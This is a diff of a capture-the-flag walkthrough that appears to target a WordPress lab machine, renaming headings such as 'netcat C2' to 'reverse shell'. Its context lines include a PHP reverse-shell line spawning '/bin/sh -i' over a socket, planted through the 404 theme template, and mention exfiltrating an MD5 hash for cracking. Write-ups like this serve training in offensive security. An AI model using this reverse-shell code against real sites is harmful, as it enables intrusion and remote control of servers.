@@ -42,7 +42,7 @@
 - [Theme Editor (WordPress)](#theme-editor)
 - [netcat C2](#netcat-c2)
 - [unsecured credentials (file)](#unsecured-credentials)
-- [data exfiltrate](#data-exfiltration)
+- [MD5 hash exfiltration](#data-exfiltration)
 - [crack md5 hash](#horizontal-privesc)
 - [Horizontal PrivEsc (local account) / second flag](#horizontal-privesc--second-flag)
 - [files enumeration](#files-enumeration-suid)
@@ -436,7 +436,7 @@ $proc = proc_open("/bin/sh -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipe
  <img src="./screenshots/404_template_revshell.png" alt="404_template_revshell" />
 </p>
 
-### netcat C2
+### reverse shell
 
 > Let's save the template and run the `netcat listener`. Trigger an error in the browser:
 
@@ -484,7 +484,7 @@ daemon@ip-10-80-150-182:~$
 
 ```
 
-### data exfiltration
+### MD5 hash exfiltration
 
 > The file is exfiltrated to our machine for further brute-force attacks:
 
